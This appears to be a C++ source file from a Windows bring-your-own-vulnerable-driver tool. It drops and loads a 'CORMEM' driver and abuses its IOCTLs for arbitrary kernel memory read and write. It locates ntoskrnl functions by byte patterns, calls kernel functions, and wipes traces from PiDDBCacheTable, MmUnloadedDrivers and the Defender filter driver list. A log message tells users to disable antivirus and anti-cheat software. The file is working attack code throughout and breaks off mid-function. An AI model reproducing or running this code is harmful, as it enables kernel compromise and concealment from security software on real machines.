#include "cormem_driver.hpp"

ULONG64 cormem_driver::ntoskrnlAddr = 0;
char cormem_driver::driver_name[100] = {};

// Pool block management
static uint32_t g_PoolBlockCount = 0;
static cormem_driver::PoolBlock g_PoolBlocks[cormem_driver::CORMEM_MAX_POOL_BLOCKS] = {};

std::wstring cormem_driver::GetDriverNameW() {
	std::string t(cormem_driver::driver_name);
	std::wstring name(t.begin(), t.end());
	return name;
}

std::wstring cormem_driver::GetDriverPath() {
	std::wstring temp = utils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

bool cormem_driver::IsRunning() {
	const HANDLE file_handle = CreateFileA("\\\\.\\CORMEM", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

bool cormem_driver::AcquireDebugPrivilege() {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL) {
		return false;
	}

	auto RtlAdjustPrivilege = (nt::RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");

	ULONG SE_DEBUG_PRIVILEGE = 20UL;
	BOOLEAN SeDebugWasEnabled;
	NTSTATUS Status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
	if (!NT_SUCCESS(Status)) {
		Log("[-] Failed to acquire SE_DEBUG_PRIVILEGE" << std::endl);
		return false;
	}

	return true;
}

static bool MapPoolBlock(HANDLE device_handle, uint32_t Index) {
	uint32_t input = Index;
	cormem_driver::CORMEM_MAP_POOL_OUT output = {};
	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, cormem_driver::IOCTL_CORMEM_MAP_POOL, &input, sizeof(input),
		&output, sizeof(output), &bytes_returned, nullptr) || bytes_returned == 0)
		return false;

	// Check if Field1 is actually in kernel space (should be user space)
	// If it starts with 0xffff, it's kernel space, which means the fields might be swapped
	if (output.UserAddress >= 0xFFFF000000000000) {
		// Try alternative interpretation: maybe the driver returns them in different order
		// Let's try: KernelAddress, UserAddress, PhysicalAddress, Size
		uint64_t temp_kernel = output.UserAddress;
		uint64_t temp_user = output.KernelAddress;
		uint64_t temp_phys = output.PhysicalAddress;
		uint32_t temp_size = output.Size;

		// Check if temp_user looks like a valid user-space address
		if (temp_user < 0x00007FFFFFFFFFFF && temp_user != 0) {
			g_PoolBlocks[Index].UserAddress = temp_user;
			g_PoolBlocks[Index].KernelAddress = temp_kernel;
			g_PoolBlocks[Index].PhysicalAddress = temp_phys;
			g_PoolBlocks[Index].Size = temp_size;
			return true;
		}

		Log(L"[-] Could not find valid field interpretation!" << std::endl);
		return false;
	}

	g_PoolBlocks[Index].UserAddress = output.UserAddress;
	g_PoolBlocks[Index].KernelAddress = output.KernelAddress;
	g_PoolBlocks[Index].PhysicalAddress = output.PhysicalAddress;
	g_PoolBlocks[Index].Size = output.Size;

	return true;
}

static bool GetPoolBlockCount(HANDLE device_handle, uint32_t* Count) {
	uint32_t output = 0;
	DWORD bytes_returned = 0;

	Log(L"[*] Sending IOCTL_CORMEM_GET_POOL_BLOCK_COUNT (0x" << std::hex << cormem_driver::IOCTL_CORMEM_GET_POOL_BLOCK_COUNT << std::dec << L")..." << std::endl);

	BOOL result = DeviceIoControl(device_handle, cormem_driver::IOCTL_CORMEM_GET_POOL_BLOCK_COUNT, nullptr, 0,
		&output, sizeof(output), &bytes_returned, nullptr);

	if (!result) {
		DWORD error = GetLastError();
		Log(L"[-] DeviceIoControl failed with error: " << error << std::endl);
		return false;
	}

	if (bytes_returned == 0) {
		Log(L"[-] DeviceIoControl returned 0 bytes" << std::endl);
		return false;
	}

	Log(L"[+] IOCTL succeeded, returned " << bytes_returned << L" bytes, count = " << output << std::endl);

	*Count = output;
	return true;
}

HANDLE cormem_driver::Load() {
	srand((unsigned)time(NULL) * GetCurrentThreadId());

	if (cormem_driver::IsRunning()) {
		Log(L"[-] \\Device\\CORMEM is already used." << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	memset(cormem_driver::driver_name, 0, sizeof(cormem_driver::driver_name));
	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20 + 10;
	for (int i = 0; i < len; ++i)
		cormem_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	Log(L"[<] loading vun driver, name: " << GetDriverNameW() << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		Log(L"[-] can not locate temp folder" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	_wremove(driver_path.c_str());

	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(cormem_driver_resource::driver), cormem_driver_resource::driver_size)) {
		Log(L"[-] failed to create vulnerable drv file" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	if (!AcquireDebugPrivilege()) {
		Log(L"[-] failed to acquire SeDebugPrivilege" << std::endl);
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}

	if (!service::RegisterAndStart(driver_path)) {
		Log(L"[-] failed to register and start service" << std::endl);
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}

	HANDLE result = CreateFileA("\\\\.\\CORMEM", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	if (!result || result == INVALID_HANDLE_VALUE)
	{
		Log(L"[-] failed to load vun driver" << std::endl);
		cormem_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	Log(L"[+] Device handle opened successfully" << std::endl);

	Log(L"[*] Getting pool block count..." << std::endl);
	if (!GetPoolBlockCount(result, &g_PoolBlockCount) || g_PoolBlockCount > CORMEM_MAX_POOL_BLOCKS) {
		Log(L"[-] failed to get pool block count (got: " << g_PoolBlockCount << L")" << std::endl);
		cormem_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	Log(L"[+] Pool block count: " << g_PoolBlockCount << std::endl);

	for (uint32_t i = 0; i < g_PoolBlockCount; i++) {
		Log(L"[*] Mapping pool block " << i << L"..." << std::endl);
		if (!MapPoolBlock(result, i)) {
			Log(L"[-] failed to map pool block " << i << std::endl);
			cormem_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		Log(L"[+] Pool block " << i << L" mapped: User=0x" << std::hex << g_PoolBlocks[i].UserAddress
			<< L" Kernel=0x" << g_PoolBlocks[i].KernelAddress
			<< L" Phys=0x" << g_PoolBlocks[i].PhysicalAddress
			<< L" Size=0x" << g_PoolBlocks[i].Size << std::dec << std::endl);
	}

	Log(L"[*] Getting ntoskrnl.exe base address..." << std::endl);
	ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		Log(L"[-] failed to get ntoskrnl" << std::endl);
		cormem_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	Log(L"[+] ntoskrnl.exe base: 0x" << std::hex << ntoskrnlAddr << std::dec << std::endl);

	// Check MZ ntoskrnl.exe
	IMAGE_DOS_HEADER dosHeader = { 0 };
	Log(L"[*] Reading ntoskrnl DOS header from 0x" << std::hex << cormem_driver::ntoskrnlAddr << std::dec << L"..." << std::endl);
	Log(L"[*] Attempting to read " << sizeof(IMAGE_DOS_HEADER) << L" bytes..." << std::endl);

	bool readResult = cormem_driver::ReadMemory(result, cormem_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER));

	if (!readResult) {
		Log(L"[-] ReadMemory failed!" << std::endl);
		cormem_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	Log(L"[+] ReadMemory succeeded, checking DOS signature..." << std::endl);
	Log(L"[*] DOS signature: 0x" << std::hex << dosHeader.e_magic << L" (expected 0x5A4D)" << std::dec << std::endl);

	if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		Log(L"[-] can't exploit vun driver, remember to disable: AV, VGK, FaceIT etc." << std::endl);
		cormem_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
	Log(L"[+] ntoskrnl DOS header verified (MZ signature OK)" << std::endl);

	Log(L"[*] Starting PiDDBCacheTable cleanup..." << std::endl);
	if (!cormem_driver::ClearPiDDBCacheTable(result)) {
		Log(L"[-] failed to Clear PiDDBCacheTable" << std::endl);
		cormem_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!cormem_driver::ClearKernelHashBucketList(result)) {
		Log(L"[-] failed to Clear KernelHashBucketList" << std::endl);
		cormem_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!cormem_driver::ClearMmUnloadedDrivers(result)) {
		Log(L"[!] failed to Clear MmUnloadedDrivers" << std::endl);
		cormem_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!cormem_driver::ClearWdFilterDriverList(result)) {
		Log("[!] failed to Clear WdFilterDriverList" << std::endl);
		cormem_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	return result;
}

bool cormem_driver::Unload(HANDLE device_handle) {
	Log(L"[<] unloading vun driver" << std::endl);

	if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
		CloseHandle(device_handle);
	}

	if (!service::StopAndRemove(GetDriverNameW()))
		return false;

	std::wstring driver_path = GetDriverPath();

	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
	int newFileLen = static_cast<int>(cormem_driver_resource::driver_size + (((long long)rand() * (long long)rand()) % 2000000 + 1000));
	BYTE* randomData = new BYTE[newFileLen];
	for (size_t i = 0; i < newFileLen; i++) {
		randomData[i] = (BYTE)(rand() % 255);
	}
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		Log(L"[!] error dumping to disk" << std::endl);
	}
	else {
		Log(L"[+] vun driver data destroyed" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;

	if (_wremove(driver_path.c_str()) != 0)
		return false;

	return true;
}

static uint64_t MapKernelToUser(uint64_t KernelAddress) {
	for (uint32_t i = 0; i < g_PoolBlockCount; i++) {
		auto& b = g_PoolBlocks[i];
		if (KernelAddress >= b.KernelAddress && KernelAddress < b.KernelAddress + b.Size)
			return b.UserAddress + (KernelAddress - b.KernelAddress);
	}
	return 0;
}

uint64_t cormem_driver::TranslateLinearToPhysical(HANDLE device_handle, uint64_t virtual_address) {
	for (uint32_t i = 0; i < g_PoolBlockCount; i++) {
		auto& b = g_PoolBlocks[i];
		if (virtual_address >= b.KernelAddress && virtual_address < b.KernelAddress + b.Size) {
			return b.PhysicalAddress + (virtual_address - b.KernelAddress);
		}
	}

	uint64_t input = virtual_address;
	uint64_t output = 0;
	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, IOCTL_CORMEM_LINEAR_TO_PHYS, &input, sizeof(input),
		&output, sizeof(output), &bytes_returned, nullptr) || bytes_returned == 0) {
		return 0;
	}

	return output;
}

uint64_t cormem_driver::MapPhysicalMemory(HANDLE device_handle, uint64_t physical_address, uint64_t size) {
	SYSTEM_INFO si = {};
	GetSystemInfo(&si);

	uint64_t aligned_address = physical_address & ~(static_cast<uint64_t>(si.dwPageSize) - 1);
	uint64_t offset = physical_address - aligned_address;
	size += offset;

	CORMEM_MAP_BUFFER_IN input = { aligned_address, size, 0 };
	uint64_t output = 0;
	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, IOCTL_CORMEM_MAP_BUFFER, &input, sizeof(input),
		&output, sizeof(output), &bytes_returned, nullptr) || bytes_returned == 0) {
		return 0;
	}

	return output + offset;
}

bool cormem_driver::UnmapPhysicalMemory(HANDLE device_handle, uint64_t mapped_address) {
	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, IOCTL_CORMEM_UNMAP_BUFFER, &mapped_address, sizeof(mapped_address),
		nullptr, 0, &bytes_returned, nullptr);
}

bool cormem_driver::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	if (!address || !buffer || !size)
		return false;

	uint8_t* dst = static_cast<uint8_t*>(buffer);
	uint64_t remaining = size;
	uint64_t current_address = address;

	while (remaining > 0) {
		uint64_t page_offset = current_address & 0xFFF;
		uint64_t chunk_size = min(remaining, 0x1000 - page_offset);

		// Fast path: if the VA is inside one of the already-mapped pool blocks we can read
		// it directly from user space, no IOCTL and no VA->PA translation required.
		if (uint64_t direct_address = MapKernelToUser(current_address)) {
			memcpy(dst, reinterpret_cast<void*>(direct_address), chunk_size);
			dst += chunk_size;
			current_address += chunk_size;
			remaining -= chunk_size;
			continue;
		}

		uint64_t physical_address = 0;
		DWORD bytes_returned = 0;

		if (!DeviceIoControl(device_handle, IOCTL_CORMEM_LINEAR_TO_PHYS,
			&current_address, sizeof(current_address),
			&physical_address, sizeof(physical_address),
			&bytes_returned, nullptr) || bytes_returned == 0 || !physical_address) {
			Log(L"[-] ReadMemory: Failed to translate VA 0x" << std::hex << current_address
				<< L" to physical (ioctl_ok=" << (GetLastError() == ERROR_SUCCESS ? L"yes" : L"no")
				<< L", bytes=" << std::dec << bytes_returned
				<< L", phys=0x" << std::hex << physical_address
				<< L", error=" << std::dec << GetLastError() << L")" << std::endl);
			return false;
		}

		SYSTEM_INFO si = {};
		GetSystemInfo(&si);

		uint64_t aligned_phys = physical_address & ~((uint64_t)si.dwPageSize - 1);
		uint64_t offset = physical_address - aligned_phys;
		uint64_t aligned_size = chunk_size + offset;

		CORMEM_MAP_BUFFER_IN input = { aligned_phys, aligned_size, 0 };
		uint64_t mapped = 0;
		bytes_returned = 0;

		if (!DeviceIoControl(device_handle, IOCTL_CORMEM_MAP_BUFFER, &input, sizeof(input),
			&mapped, sizeof(mapped), &bytes_returned, nullptr) || bytes_returned == 0 || !mapped) {
			Log(L"[-] ReadMemory: Failed to map physical 0x" << std::hex << aligned_phys
				<< L" size 0x" << aligned_size
				<< L" (ioctl_ok=" << (GetLastError() == ERROR_SUCCESS ? L"yes" : L"no")
				<< L", bytes=" << std::dec << bytes_returned
				<< L", error=" << GetLastError() << L")" << std::endl);
			return false;
		}

		// Validate mapped address is in user-mode range (Windows x64: 0x00000000'00000000 to 0x00007FFF'FFFFFFFF)
		// However, some drivers may use high addresses, so let's be more lenient and just check it's not kernel space
		if (mapped >= 0xFFFF800000000000) {
			Log(L"[-] ReadMemory: Mapped address 0x" << std::hex << mapped
				<< L" is in kernel space!" << std::dec << std::endl);
			DWORD br = 0;
			DeviceIoControl(device_handle, IOCTL_CORMEM_UNMAP_BUFFER, &mapped, sizeof(mapped), nullptr, 0, &br, nullptr);
			return false;
		}

		uint64_t final_address = mapped + offset;
		void* mapped_ptr = reinterpret_cast<void*>(final_address);

		if (IsBadReadPtr(mapped_ptr, chunk_size)) {
			void* mapped_ptr_no_offset = reinterpret_cast<void*>(mapped);
			if (IsBadReadPtr(mapped_ptr_no_offset, chunk_size)) {
				Log(L"[-] ReadMemory: Mapped address 0x" << std::hex << mapped
					<< L" is not readable!" << std::dec << std::endl);
				DWORD br = 0;
				DeviceIoControl(device_handle, IOCTL_CORMEM_UNMAP_BUFFER, &mapped, sizeof(mapped), nullptr, 0, &br, nullptr);
				return false;
			} else {
				mapped_ptr = mapped_ptr_no_offset;
			}
		}

		memcpy(dst, mapped_ptr, chunk_size);

		DWORD br = 0;
		DeviceIoControl(device_handle, IOCTL_CORMEM_UNMAP_BUFFER, &mapped, sizeof(mapped), nullptr, 0, &br, nullptr);

		dst += chunk_size;
		current_address += chunk_size;
		remaining -= chunk_size;
	}

	return true;
}

bool cormem_driver::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	if (!address || !buffer || !size)
		return false;

	const uint8_t* src = static_cast<const uint8_t*>(buffer);
	uint64_t remaining = size;
	uint64_t current_address = address;

	while (remaining > 0) {
		// Calculate chunk size
		uint64_t page_offset = current_address & 0xFFF;
		uint64_t chunk_size = min(remaining, 0x1000 - page_offset);

		// Fast path: write directly through the mapped pool block if the VA falls inside one.
		if (uint64_t direct_address = MapKernelToUser(current_address)) {
			memcpy(reinterpret_cast<void*>(direct_address), src, chunk_size);
			src += chunk_size;
			current_address += chunk_size;
			remaining -= chunk_size;
			continue;
		}

		// Translate kernel virtual address to physical address
		uint64_t physical_address = 0;
		DWORD bytes_returned = 0;

		if (!DeviceIoControl(device_handle, IOCTL_CORMEM_LINEAR_TO_PHYS,
			&current_address, sizeof(current_address),
			&physical_address, sizeof(physical_address),
			&bytes_returned, nullptr) || bytes_returned == 0 || !physical_address) {
			Log(L"[-] WriteMemory: Failed to translate VA 0x" << std::hex << current_address
				<< L" to physical (ioctl_ok=" << (GetLastError() == ERROR_SUCCESS ? L"yes" : L"no")
				<< L", bytes=" << std::dec << bytes_returned
				<< L", phys=0x" << std::hex << physical_address
				<< L", error=" << std::dec << GetLastError() << L")" << std::endl);
			return false;
		}

		SYSTEM_INFO si = {};
		GetSystemInfo(&si);

		uint64_t aligned_phys = physical_address & ~((uint64_t)si.dwPageSize - 1);
		uint64_t offset = physical_address - aligned_phys;
		uint64_t aligned_size = chunk_size + offset;

		CORMEM_MAP_BUFFER_IN input = { aligned_phys, aligned_size, 0 };
		uint64_t mapped = 0;
		bytes_returned = 0;

		if (!DeviceIoControl(device_handle, IOCTL_CORMEM_MAP_BUFFER, &input, sizeof(input),
			&mapped, sizeof(mapped), &bytes_returned, nullptr) || bytes_returned == 0 || !mapped) {
			Log(L"[-] WriteMemory: Failed to map physical 0x" << std::hex << aligned_phys
				<< L" size 0x" << aligned_size
				<< L" (ioctl_ok=" << (GetLastError() == ERROR_SUCCESS ? L"yes" : L"no")
				<< L", bytes=" << std::dec << bytes_returned
				<< L", error=" << GetLastError() << L")" << std::endl);
			return false;
		}

		if (mapped >= 0x00007FFFFFFFFFFF) {
			Log(L"[-] WriteMemory: Mapped address 0x" << std::hex << mapped
				<< L" is not in user-mode range!" << std::dec << std::endl);
			DWORD br = 0;
			DeviceIoControl(device_handle, IOCTL_CORMEM_UNMAP_BUFFER, &mapped, sizeof(mapped), nullptr, 0, &br, nullptr);
			return false;
		}

		uint64_t final_address = mapped + offset;
		void* mapped_ptr = reinterpret_cast<void*>(final_address);

		if (IsBadWritePtr(mapped_ptr, chunk_size)) {
			void* mapped_ptr_no_offset = reinterpret_cast<void*>(mapped);
			if (IsBadWritePtr(mapped_ptr_no_offset, chunk_size)) {
				Log(L"[-] WriteMemory: Mapped address 0x" << std::hex << mapped
					<< L" is not writable!" << std::dec << std::endl);
				DWORD br = 0;
				DeviceIoControl(device_handle, IOCTL_CORMEM_UNMAP_BUFFER, &mapped, sizeof(mapped), nullptr, 0, &br, nullptr);
				return false;
			} else {
				mapped_ptr = mapped_ptr_no_offset;
			}
		}

		memcpy(mapped_ptr, src, chunk_size);

		DWORD br = 0;
		DeviceIoControl(device_handle, IOCTL_CORMEM_UNMAP_BUFFER, &mapped, sizeof(mapped), nullptr, 0, &br, nullptr);

		src += chunk_size;
		current_address += chunk_size;
		remaining -= chunk_size;
	}

	return true;
}

bool cormem_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size) {
	// Cormem driver -> physical memory writes bypass page protections
	return WriteMemory(device_handle, address, buffer, size);
}

uint64_t cormem_driver::MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size)
{
	uint64_t allocated_pages{};

	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;

	if (!kernel_MmAllocateIndependentPagesEx)
	{
		kernel_MmAllocateIndependentPagesEx = cormem_driver::FindPatternInSectionAtKernel(device_handle, (char*)".text", cormem_driver::ntoskrnlAddr,
			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8", // Working pattern for Windows 10 22H2 19045.2965 and Windows 11 22H2 22621.963 (thank god for virtual machines)
			(char*)"xxxxxxxxx????xxx");
		if (!kernel_MmAllocateIndependentPagesEx) {
			Log(L"[!] failed to locate MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}

		kernel_MmAllocateIndependentPagesEx += 8;

		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
		if (!kernel_MmAllocateIndependentPagesEx) {
			Log(L"[!] failed to locate MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
	}

	if (!cormem_driver::CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
		return 0;

	return allocated_pages;
}

bool cormem_driver::MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size)
{
	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages)
	{
		kernel_MmFreeIndependentPages = cormem_driver::FindPatternInSectionAtKernel(device_handle, "PAGE", cormem_driver::ntoskrnlAddr,
			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
			(char*)"xxxxxxxxx????xxxxxxx");
		if (!kernel_MmFreeIndependentPages) {
			Log(L"[!] failed to locate MmFreeIndependentPages" << std::endl);
			return false;
		}

		kernel_MmFreeIndependentPages += 8;

		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmFreeIndependentPages, 1, 5);
		if (!kernel_MmFreeIndependentPages) {
			Log(L"[!] failed to locate MmFreeIndependentPages" << std::endl);
			return false;
		}
	}

	uint64_t result{};
	return cormem_driver::CallKernelFunction(device_handle, &result, kernel_MmFreeIndependentPages, address, size);
}

BOOLEAN cormem_driver::MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
	{
		Log(L"[!] invalid address to MmSetPageProtection" << std::endl);
		return FALSE;
	}

	static uint64_t kernel_MmSetPageProtection = 0;

	if (!kernel_MmSetPageProtection)
	{
		kernel_MmSetPageProtection = cormem_driver::FindPatternInSectionAtKernel(device_handle, "PAGELK", cormem_driver::ntoskrnlAddr,
			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
			(char*)"xx??x???xxx");
		if (!kernel_MmSetPageProtection) {

			kernel_MmSetPageProtection = cormem_driver::FindPatternInSectionAtKernel(device_handle, "PAGELK", cormem_driver::ntoskrnlAddr,
				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
				(char*)"xx??xx????x???xxx");

			if (!kernel_MmSetPageProtection) {
				Log(L"[!] failed to locate MmSetPageProtection" << std::endl);
				return FALSE;
			}

			kernel_MmSetPageProtection += 13;
		}
		else {
			kernel_MmSetPageProtection += 10;
		}

		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmSetPageProtection, 1, 5);
		if (!kernel_MmSetPageProtection) {
			Log(L"[!] failed to locate MmSetPageProtection" << std::endl);
			return FALSE;
		}
	}

	BOOLEAN set_prot_status{};
	if (!cormem_driver::CallKernelFunction(device_handle, &set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;

	return set_prot_status;
}

uint64_t cormem_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, cormem_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");

	if (!kernel_ExAllocatePool) {
		Log(L"[!] failed to locate ExAllocatePool" << std::endl);
		return 0;
	}

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE'))
		return 0;

	return allocated_pool;
}

bool cormem_driver::FreePool(HANDLE device_handle, uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, cormem_driver::ntoskrnlAddr, "ExFreePool");

	if (!kernel_ExFreePool) {
		Log(L"[!] failed to locate ExAllocatePool" << std::endl);
		return 0;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
}

uint64_t cormem_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(device_handle, kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0;
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

bool cormem_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH)
	{
		VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status) || buffer == 0)
	{
		if (buffer != 0)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;

	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == device_handle)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	uint64_t device_object = 0;

	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		Log(L"[!] failed to locate device_object" << std::endl);
		return false;
	}

	uint64_t driver_object = 0;

	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		Log(L"[!] failed to locate driver_object" << std::endl);
		return false;
	}

	uint64_t driver_section = 0;

	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		Log(L"[!] failed to locate driver_section" << std::endl);
		return false;
	}

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		Log(L"[!] failed to locate driver name" << std::endl);
		return false;
	}

	auto unloadedName = std::make_unique<wchar_t[]>((ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL);
	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
		Log(L"[!] failed to read drv name" << std::endl);
		return false;
	}

	us_driver_base_dll_name.Length = 0;

	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		Log(L"[!] failed to write driver name length" << std::endl);
		return false;
	}

	Log(L"[+] MmUnloadedDriver Cleaned: " << unloadedName << std::endl);
	return true;
}

PVOID cormem_driver::ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
